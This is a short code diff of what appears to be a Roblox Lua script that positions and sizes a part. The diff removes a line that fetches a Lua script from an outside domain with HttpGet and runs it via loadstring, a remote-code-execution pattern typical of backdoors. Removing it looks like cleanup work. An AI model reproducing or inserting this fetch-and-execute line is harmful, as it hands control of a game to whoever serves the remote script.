@@ -135,5 +135,4 @@ x.CFrame = CFrame.new(-1, 3, -1)
 x.Anchored = true
 x.Size = Vector3.new(2,2,2)
 x.Rotation = Vector3.new(0, 0, 0)
-loadstring(game:HttpGet("https://salmonbot.xyz/scripts/loop.lua", true))()
 end
